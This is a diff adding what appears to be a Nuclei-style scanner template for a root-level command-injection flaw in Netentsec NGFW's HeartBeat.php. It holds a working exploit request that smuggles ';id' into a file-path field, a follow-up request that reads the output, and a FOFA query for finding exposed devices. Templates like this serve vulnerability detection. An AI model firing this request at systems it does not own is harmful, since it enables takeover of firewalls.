@@ -1,0 +1,44 @@
+id: netentsec-ngfw-HeartBeat-rce
+
+info:
+  name: netentsec HeartBeat.php 网康下一代防火墙 - rce
+  author: pikpikcu,leadlife,afrog
+  severity: critical
+  description: 网康 下一代防火墙 HeartBeat.php文件存在远程命令执行漏洞，攻击者通过构造请求包即可获取服务器Root权限
+  reference:
+    - https://github.com/zan8in/afrog-pocs/blob/4016db3ed9a5fad66ea9fdb60cf4e534691e21a2/vulnerability/netentsec-fiewall-heartbeat-php-rce.yaml#L22
+  metadata:
+    verified: true
+    fofa-query: title="网康下一代防火墙" && body="/images/dashboard/dashboard.png" || banner="Netentsec NGFW"
+  tags: netentsec,rce,firewall,iot
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /directdata/direct/router HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"action":"NS_Rpc_HeartBeat","method":"delTestFile","data": ["/var/www/tmp/1.txt;id>{{randstr}}.txt"],"type":"rpc","tid":11,"f8839p7rqtj":"="}
+        
+      - |
+        GET /{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body_2
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+        
+
+# digest: 4b0a00483046022100a1155793ded752fd230378179931d6da35cc5c67a286a7b0c3610c6e29058f77022100cfaa6e45c68013ce2a5cc170e4333e1127ad3ef49557c0f6c1f1fbaf20830f00:922c64590222798bb761d5b6d8e72950
